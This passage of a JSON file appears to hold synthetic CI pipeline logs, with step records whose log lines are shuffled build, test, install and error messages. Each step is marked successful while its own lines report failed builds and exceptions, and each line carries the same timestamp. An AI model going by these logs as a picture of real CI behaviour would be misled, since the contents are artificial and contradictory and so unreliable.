          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@2.3.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 1/10: Building",
          "Cache hit for key-6534",
          "Installing jest@3.20.0",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "  PASS: test_api_health (128ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_user_create (59ms)",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (332ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_db_connect (165ms)",
          "FAILED: test_cache_hit",
          "  PASS: test_cache_hit (233ms)",
          "Compiling src/service.java...",
          "  PASS: test_user_create (229ms)",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Step 5/10: Building",
          "Step 2/10: Building",
          "Cache hit for key-5063",
          "  PASS: test_cache_hit (127ms)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Cache hit for key-7224",
          "Compiling src/index.js...",
          "Cache hit for key-3471",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-9835",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Step 2/10: Building",
          "Cache hit for key-2588",
          "Cache hit for key-8947",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Installing webpack@1.13.0",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-4789",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@3.0.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 build completed",
          "Cache hit for key-2228",
          "Compiling src/service.java...",
          "Cache hit for key-3754",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 3/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_user_create (399ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-2648",
          "Cache hit for key-2314",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@5.6.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-8271",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/index.js...",
          "Cache hit for key-2590",
          "\u2713 test completed",
          "\u2717 build failed with exit code 97",
          "\u2713 test completed",
          "Step 8/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Installing webpack@1.9.0",
          "Cache hit for key-8335",
          "  PASS: test_auth_login (85ms)",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "Installing lodash@5.10.0",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (452ms)",
          "Cache hit for key-6169",
          "[12:00:35] INFO: Processing request",
          "Installing express@1.9.0",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-14T12:00:38.242046",
        "finished_at": "2025-12-14T12:00:42.911950",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_auth_login (379ms)",
          "Cache hit for key-7619",
          "Compiling src/main.py...",
          "  PASS: test_user_create (2ms)",
          "FAILED: test_auth_login",
          "  PASS: test_api_health (312ms)",
          "\u2713 test completed",
          "Installing jest@4.13.0",
          "[12:00:35] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_cache_hit (312ms)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (256ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_cache_hit (266ms)",
          "Step 2/10: Building",
          "Installing eslint@2.3.0",
          "Installing express@3.19.0",
          "Cache hit for key-6908",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@2.18.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-7516",
          "Compiling src/utils.go...",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (153ms)",
          "[12:00:35] ERROR: Connection failed",
          "Installing jest@3.20.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing lodash@2.7.0",
          "Cache hit for key-4662",
          "\u2713 build completed",
          "Step 1/10: Building",
          "\u2717 build failed with exit code 57",
          "  PASS: test_api_health (381ms)",
          "Cache hit for key-2047",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Exception: TypeError",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Step 7/10: Building",
          "  PASS: test_api_health (226ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Step 6/10: Building",
          "Cache hit for key-4053",
          "WARNING: jest has known vulnerabilities",
          "Installing jest@3.10.0",
          "Cache hit for key-4936",
          "\u2713 test completed",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-9426",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Installing eslint@1.12.0",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (350ms)",
          "Cache hit for key-9366",
          "  PASS: test_auth_login (56ms)",
          "Step 4/10: Building",
          "[12:00:35] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@1.0.0",
          "Installing prettier@4.19.0",
          "\u2713 lint completed",
          "Cache hit for key-8784",
          "Step 1/10: Building",
          "Installing axios@4.4.0",
          "  PASS: test_user_create (459ms)",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "  PASS: test_api_health (492ms)",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Installing jest@3.12.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "  PASS: test_api_health (357ms)",
          "  PASS: test_auth_login (16ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing react@2.6.0",
          "Cache hit for key-7480",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_cache_hit (61ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_db_connect (415ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:35] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Installing eslint@4.1.0",
          "Installing axios@2.14.0",
          "\u2713 build completed",
          "FAILED: test_user_create",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/utils.go...",
          "WARNING: jest has known vulnerabilities",
          "Step 1/10: Building",
          "WARNING: express has known vulnerabilities",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-14T12:00:42.911950",
        "finished_at": "2025-12-14T12:00:58.478298",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Installing jest@5.1.0",
          "\u2713 lint completed",
          "Cache hit for key-3845",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-7128",
          "\u2713 build completed",
          "  PASS: test_db_connect (120ms)",
          "Installing lodash@1.7.0",
          "[12:00:35] INFO: Processing request",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Installing prettier@1.17.0",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2717 build failed with exit code 109",
          "  PASS: test_user_create (464ms)",
          "Step 9/10: Building",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_db_connect (442ms)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "  PASS: test_db_connect (176ms)",
          "Step 7/10: Building",
          "  PASS: test_db_connect (187ms)",
          "[12:00:35] INFO: Processing request",
          "Installing react@1.16.0",
          "WARNING: axios has known vulnerabilities",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_cache_hit (416ms)",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "\u2713 build completed",
          "  PASS: test_cache_hit (261ms)",
          "Installing express@4.17.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 test completed",
          "FAILED: test_user_create",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "Installing eslint@3.19.0",
          "Cache hit for key-2419",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (354ms)",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (212ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2717 build failed with exit code 104",
          "Compiling src/index.js...",
          "Installing axios@1.5.0",
          "Cache hit for key-9499",
          "Cache hit for key-9497",
          "  PASS: test_user_create (302ms)",
          "Installing webpack@1.2.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "WARNING: jest has known vulnerabilities",
          "Step 5/10: Building",
          "  PASS: test_auth_login (409ms)",
          "Compiling src/service.java...",
          "Cache hit for key-5060",
          "Cache hit for key-8137",
          "\u2713 lint completed",
          "Cache hit for key-7371",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-9968",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] ERROR: Connection failed",
          "Installing prettier@2.18.0",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "Cache hit for key-2161",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Exception: RuntimeError",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (313ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing eslint@1.7.0",
          "  PASS: test_api_health (431ms)",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (71ms)",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Cache hit for key-3510",
          "  PASS: test_cache_hit (118ms)",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-5081",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-14T12:00:58.478298",
        "finished_at": "2025-12-14T12:01:03.148202",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Cache hit for key-4930",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_db_connect (113ms)",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-1415",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_db_connect (67ms)",
          "\u2713 build completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "FAILED: test_api_health",
          "Cache hit for key-1920",
          "Cache hit for key-3797",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_auth_login (53ms)",
          "Installing lodash@4.18.0",
          "Cache hit for key-5417",
          "  PASS: test_db_connect (180ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Cache hit for key-2530",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (209ms)",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "Exception: TypeError",
          "\u2713 lint completed",
          "Cache hit for key-8239",
          "Installing jest@1.20.0",
          "  PASS: test_db_connect (103ms)",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing eslint@1.5.0",
          "\u2713 lint completed",
          "Installing lodash@4.12.0",
          "Installing lodash@1.4.0",
          "Compiling src/utils.go...",
          "Installing react@3.4.0",
          "Cache hit for key-5552",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (15ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Installing eslint@3.0.0",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] WARN: Deprecated API usage",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Installing lodash@4.19.0",
          "Cache hit for key-3787",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (166ms)",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 test completed",
          "Cache hit for key-2427",
          "[12:00:35] INFO: Processing request",
          "FAILED: test_user_create",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "[12:00:35] ERROR: Connection failed",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-3478",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-8950",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-8429",
          "  PASS: test_user_create (500ms)",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:35] INFO: Processing request",
          "\u2717 build failed with exit code 124",
          "[12:00:35] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_auth_login (267ms)",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@2.18.0",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "Cache hit for key-9208",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-7181",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-9332",
          "  PASS: test_db_connect (360ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_api_health (369ms)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Installing eslint@5.19.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing axios@3.20.0",
          "Installing jest@5.4.0",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@4.11.0",
          "\u2713 build completed",
          "  PASS: test_api_health (16ms)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-14T12:01:03.148202",
        "finished_at": "2025-12-14T12:01:10.931376",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing axios@3.6.0",
          "Cache hit for key-9833",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "Cache hit for key-1350",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (379ms)",
          "\u2713 build completed",
          "Installing axios@3.15.0",
          "Cache hit for key-2722",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/main.py...",
          "Installing webpack@2.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_auth_login (341ms)",
          "Cache hit for key-5340",
          "  PASS: test_cache_hit (6ms)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (270ms)",
          "\u2713 build completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-9001",
          "Cache hit for key-5599",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "Cache hit for key-1619",
          "Installing webpack@5.2.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-5816",
          "Installing eslint@1.19.0",
          "  PASS: test_user_create (292ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing react@4.18.0",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing jest@5.0.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-1373",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:35] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_db_connect (235ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 6/10: Building",
          "  PASS: test_user_create (412ms)",
          "Installing axios@4.18.0",
          "\u2713 build completed",
          "Installing eslint@2.5.0",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 7/10: Building",
          "Installing jest@1.12.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Installing axios@2.12.0",
          "\u2713 lint completed",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-2685",
          "Installing prettier@2.2.0",
          "Compiling src/main.py...",
          "[12:00:35] ERROR: Connection failed",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-4519",
          "  PASS: test_cache_hit (231ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_cache_hit (220ms)",
          "  PASS: test_api_health (22ms)",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Cache hit for key-1616",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (41ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "  PASS: test_auth_login (488ms)",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_db_connect (443ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-8218",
          "Installing express@3.14.0",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "Installing prettier@1.14.0",
          "Step 10/10: Building",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing jest@1.5.0",
          "Installing react@4.12.0",
          "[12:00:35] INFO: Processing request",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-14T12:01:10.931376",
        "finished_at": "2025-12-14T12:01:34.280898",
        "log_lines": [
          "=== Step: build ===",
          "\u2713 lint completed",
          "Installing webpack@2.1.0",
          "Cache hit for key-8941",
          "  PASS: test_api_health (459ms)",
          "Installing jest@2.12.0",
          "Cache hit for key-9127",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3626",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:35] INFO: Processing request",
          "Installing axios@3.10.0",
          "Step 9/10: Building",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_api_health (53ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-9792",
          "  PASS: test_auth_login (284ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "Installing lodash@3.9.0",
          "Installing prettier@4.13.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Step 1/10: Building",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing react@5.5.0",
          "Installing react@5.3.0",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (114ms)",
          "Compiling src/index.js...",
          "[12:00:35] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "  PASS: test_api_health (442ms)",
          "[12:00:35] WARN: Deprecated API usage",
          "  PASS: test_user_create (461ms)",
          "Installing express@3.17.0",
          "Cache hit for key-8743",
          "Step 10/10: Building",
          "Cache hit for key-8021",
          "Compiling src/app.ts...",
          "[12:00:35] INFO: Processing request",
          "Step 3/10: Building",
          "Installing express@4.14.0",
          "[12:00:35] ERROR: Connection failed",
          "Cache hit for key-3131",
          "Installing jest@5.11.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (154ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (95ms)",
          "Installing axios@2.18.0",
          "Installing webpack@1.5.0",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-6216",
          "Step 10/10: Building",
          "\u2713 test completed",
          "FAILED: test_db_connect",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "[12:00:35] ERROR: Connection failed",
          "Cache hit for key-6854",
          "Cache hit for key-2592",
          "[12:00:35] INFO: Processing request",
          "Installing jest@5.9.0",
          "  PASS: test_cache_hit (247ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 6/10: Building",
          "[12:00:35] INFO: Processing request",
          "Exception: ValueError",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-8171",
          "  PASS: test_user_create (56ms)",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (249ms)",
          "Installing eslint@1.18.0",
          "  PASS: test_db_connect (458ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-6798",
          "Compiling src/service.java...",
          "[12:00:35] INFO: Processing request",
          "Installing express@3.17.0",
          "Cache hit for key-6027",
          "Installing prettier@5.16.0",
          "[12:00:35] INFO: Processing request",
          "Step 4/10: Building",
          "Step 3/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Cache hit for key-2676",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_db_connect (77ms)",
          "[12:00:35] INFO: Processing request",
          "Cache hit for key-3491",
          "Cache hit for key-2477",
          "FAILED: test_api_health",
          "  PASS: test_cache_hit (354ms)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-3202",
          "Cache hit for key-6185",
          "[12:00:35] INFO: Processing request",
          "Installing prettier@5.19.0",
          "[12:00:35] WARN: Deprecated API usage",
          "Cache hit for key-1963",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-14T12:01:34.280898",
        "finished_at": "2025-12-14T12:01:42.064072",
        "log_lines": [
          "=== Step: type_check ===",
          "Cache hit for key-5374",
          "  PASS: test_db_connect (412ms)",
          "Installing webpack@2.20.0",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Cache hit for key-5364",
          "Step 9/10: Building",
          "[12:00:35] INFO: Processing request",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-7028",
          "  PASS: test_api_health (50ms)",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 test completed",
          "  PASS: test_user_create (356ms)",
          "Installing prettier@2.9.0",
          "Compiling src/main.py...",
          "[12:00:35] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:35] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:35] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Installing axios@3.6.0",
          "[12:00:35] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-4145",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Cache hit for key-7942",
          "Step 8/10: Building",
          "  PASS: test_auth_login (154ms)",
          "\u2713 build completed",
          "[12:00:35] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (178ms)",
          "Step 1/10: Building",
          "Cache hit for key-2174",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing react@4.5.0",
          "  PASS: test_cache_hit (244ms)",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-4521",
          "Exception: NullPointerException",
          "Installing prettier@3.13.0",
          "Installing webpack@5.0.0",
          "Cache hit for key-3230",
          "Installing react@2.17.0",
          "Installing jest@3.16.0",
          "[12:00:35] INFO: Processing request",
